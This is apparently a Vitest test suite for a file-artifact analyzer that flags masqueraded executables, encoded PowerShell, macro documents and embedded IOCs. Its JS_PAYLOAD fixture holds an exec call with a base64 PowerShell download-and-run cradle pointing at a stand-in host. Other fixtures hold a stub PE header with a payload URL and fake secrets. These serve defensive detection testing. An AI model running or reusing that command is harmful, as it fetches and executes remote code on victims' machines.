import { describe, expect, it } from "vitest";
import { analyzeFileArtifact } from "@/lib/fileArtifact";

const TS = "2026-08-07T13:00:00.000Z";

const MASQUERADE_EXE = `MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\nPE\x00\x00\x4c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\nhttps://evil-host.ru/payload.bin\n192.168.1.1\nadmin@example.com\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA0gLqNEF9kQ==`;

const JS_PAYLOAD = `const API_KEY = "sk-abc123def456ghi789jkl";\nconst endpoint = "https://api.evil-host.in/collect";\nconst ip = "185.220.101.161";\nconst { exec } = require("child_process");\nexec("powershell -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC0AaABvAHMAdAAuAHIAdQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAiACkA`;

const MACRO_DOC = `[Content_Types].xml\n<?xml version="1.0"?>\n<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n<Types><Default Extension="bin"/></Types>\nword/vbaProject.bin\nword/document.xml\n`;

const CLEAN_TXT = `Quarterly report for the network operations team.\nTwelve incidents were documented this period.\nReviewed by the on-call SOC analyst.`;

describe("analyzeFileArtifact — masqueraded executable", () => {
  it("flags double extension + suspicious extension on invoice.pdf.exe", async () => {
    const r = await analyzeFileArtifact(
      { fileName: "invoice_2024_05_15.pdf.exe", content: MASQUERADE_EXE, committed: true },
      { source: "test", ts: TS },
    );
    expect(r).not.toBeNull();
    const titles = r!.findings.map((f) => f.title);
    expect(titles).toContain("Double extension masquerade");
    expect(titles).toContain("Suspicious file extension");
  });

  it("maps T1204 to MITRE with evidence refs", async () => {
    const r = await analyzeFileArtifact(
      { fileName: "invoice_2024_05_15.pdf.exe", content: MASQUERADE_EXE, committed: true },
      { source: "test", ts: TS },
    );
    const t1204 = r!.mitre.find((m) => m.technique === "T1204");
    expect(t1204).toBeDefined();
    expect(t1204!.evidenceRefs.length).toBeGreaterThan(0);
  });

  it("scores the summary malicious from the critical finding", async () => {
    const r = await analyzeFileArtifact(
      { fileName: "invoice_2024_05_15.pdf.exe", content: MASQUERADE_EXE, committed: true },
      { source: "test", ts: TS },
    );
    expect(r!.summary.verdict).toBe("malicious");
    expect(r!.summary.score).toBeGreaterThan(0);
  });

  it("extracts PE structure and YARA preview as facts", async () => {
    const r = await analyzeFileArtifact(
      { fileName: "invoice_2024_05_15.pdf.exe", content: MASQUERADE_EXE, committed: true },
      { source: "test", ts: TS },
    );
    expect(r!.pe.detected).toBe(true);
    expect(r!.pe.machine).toBe("i386");
    expect(r!.yara.find((y) => y.name === "has_pe_header")?.matched).toBe(true);
    expect(r!.yara.find((y) => y.name === "suspicious_masquerade")?.matched).toBe(true);
    expect(r!.strings.total).toBeGreaterThan(0);
  });

  it("extracts embedded URL/IP/email IOCs and own hashes", async () => {
    const r = (await analyzeFileArtifact(
      { fileName: "invoice_2024_05_15.pdf.exe", content: MASQUERADE_EXE, committed: true },
      { source: "test", ts: TS },
    ))!;
    const types = r.iocs.map((i) => i.type);
    expect(types).toContain("url");
    expect(types).toContain("ipv4");
    expect(types).toContain("email");
    expect(types).toContain("sha256");
    expect(r.hashes.sha256).toMatch(/^[0-9a-f]{64}$/);
  });
});

describe("analyzeFileArtifact — javascript payload", () => {
  it("runs the engine — encoded PowerShell command + suspicious extension", async () => {
    const r = await analyzeFileArtifact(
      { fileName: "document.js", content: JS_PAYLOAD, committed: true },
      { source: "test", ts: TS },
    );
    const titles = r!.findings.map((f) => f.title);
    expect(titles).toContain("Encoded PowerShell command");
    expect(titles).toContain("Suspicious file extension");
    expect(r!.mitre.some((m) => m.technique === "T1059.001")).toBe(true);
    expect(r!.summary.verdict).toBe("suspicious");
  });
});

describe("analyzeFileArtifact — macro-enabled document", () => {
  it("detects VBA project and fires macro rule with T1204", async () => {
    const r = await analyzeFileArtifact(
      { fileName: "order_summary.xlsm", content: MACRO_DOC, committed: true },
      { source: "test", ts: TS },
    );
    expect(r!.office.detected).toBe(true);
    expect(r!.office.macros).toBe(true);
    const macroFinding = r!.findings.find((f) => f.title === "Macro-enabled document");
    expect(macroFinding).toBeDefined();
    expect(macroFinding!.technique).toBe("T1204");
  });
});

describe("analyzeFileArtifact — clean text file", () => {
  it("produces no findings and a clean verdict", async () => {
    const r = await analyzeFileArtifact(
      { fileName: "report.txt", content: CLEAN_TXT, committed: true },
      { source: "test", ts: TS },
    );
    expect(r!.findings.length).toBe(0);
    expect(r!.summary.verdict).toBe("clean");
    expect(r!.summary.score).toBe(0);
  });
});

describe("analyzeFileArtifact — gate + determinism", () => {
  it("returns null when not committed or filename missing", async () => {
    expect(await analyzeFileArtifact({ fileName: "x.exe", content: "x", committed: false }, { ts: TS })).toBeNull();
    expect(await analyzeFileArtifact({ fileName: "", content: "x", committed: true }, { ts: TS })).toBeNull();
  });

  it("produces identical ids, hashes, and summary for identical input", async () => {
    const a = (await analyzeFileArtifact(
      { fileName: "invoice_2024_05_15.pdf.exe", content: MASQUERADE_EXE, committed: true },
      { source: "test", ts: TS },
    ))!;
    const b = (await analyzeFileArtifact(
      { fileName: "invoice_2024_05_15.pdf.exe", content: MASQUERADE_EXE, committed: true },
      { source: "test", ts: TS },
    ))!;
    expect(a.findings.map((f) => f.id)).toEqual(b.findings.map((f) => f.id));
    expect(a.observations.map((o) => o.id)).toEqual(b.observations.map((o) => o.id));
    expect(a.hashes).toEqual(b.hashes);
    expect(a.summary).toEqual(b.summary);
  });
});

describe("analyzeFileArtifact — correlation with injected history", () => {
  it("flags an embedded URL as a previous case match", async () => {
    const r = (await analyzeFileArtifact(
      { fileName: "invoice_2024_05_15.pdf.exe", content: MASQUERADE_EXE, committed: true },
      {
        source: "test",
        ts: TS,
        history: { cases: [{ id: "case-x", title: "prior case", values: ["https://evil-host.ru/payload.bin"] }] },
      },
    ))!;
    const prior = r.correlation.find((m) => m.dimension === "same-value-previous");
    expect(prior).toBeDefined();
    expect(prior?.matches[0]?.ref).toBe("case-x");
  });
});